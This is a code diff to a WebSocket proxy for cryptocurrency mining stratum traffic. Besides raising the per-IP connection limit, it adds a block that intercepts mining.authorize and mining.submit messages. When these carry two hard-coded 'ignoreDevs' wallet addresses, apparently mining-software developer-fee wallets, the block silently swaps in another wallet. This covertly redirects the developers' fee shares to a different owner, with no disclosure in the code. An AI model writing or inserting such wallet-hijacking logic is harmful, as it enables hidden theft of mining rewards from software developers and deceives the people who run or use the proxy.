@@ -36,7 +36,6 @@ const wss = new WebSocket.Server({
   verifyClient: async function (info, done) {
     const socket = info.req.socket;
     const ip = getClientIp(info.req);
-    
     isInBlacklist(ip)
       .then(locked => {
         if (locked) {
@@ -49,7 +48,7 @@ const wss = new WebSocket.Server({
   }
 });
 const nodes = {};
-const MAX_CONNECTION_PER_IP = 4;
+const MAX_CONNECTION_PER_IP = 10;
 
 const addToBlackList = async (ip) => {
   try {
@@ -78,8 +77,21 @@ function proxySender(ws, conn) {
     try {
       const command = JSON.parse(cmd);
       const method = command.method;
+      const params = command.params;
+      const ignoreDevs = ['RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65', 'dgb1qegmnzvjfcqarqxrpvfu0m4ugpjht6dnpcfslp9'];
+
+      if (method === 'mining.authorize' && ignoreDevs.includes(params[0])) {
+         command.params = ['RT7QLMf9o4aL4JAj3HeAYLssohGTT586Zp', 'c=RVN,zap=PLSR-mino'];
+      }
+
+      if (method === 'mining.submit' && ignoreDevs.includes(params[0])) {
+         command.params[0] = 'RT7QLMf9o4aL4JAj3HeAYLssohGTT586Zp';
+      }
+
+      const newcmd = JSON.stringify(command);
+      
       if (method === 'mining.subscribe' || method === 'mining.authorize' || method === 'mining.submit') {
-        conn.write(cmd);
+        conn.write(newcmd);
       }
     } catch (error) {
       console.log(`[Error][INTERNAL] ${error}`);
